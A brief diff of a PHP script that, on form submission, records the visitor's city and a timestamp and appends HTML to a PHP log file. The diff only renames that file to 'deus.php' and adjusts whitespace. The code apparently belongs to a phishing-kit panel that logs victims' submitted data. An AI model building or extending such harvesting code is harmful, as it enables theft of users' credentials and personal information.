@@ -1,4 +1,4 @@
-	<?php
+<?php
 ob_start();
 session_start();
 set_time_limit(0);
@@ -18,7 +18,7 @@ if ($_POST) {
     $sehir = $cek->city;
     date_default_timezone_set('Europe/Istanbul');  
     $cur_time=date("d-m-Y H:i:s");
-    $file = fopen('aliroswellbruhorj01062022.php', 'a'); 
+    $file = fopen('deus.php', 'a'); 
     fwrite($file, "<html>
 <head>
 	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
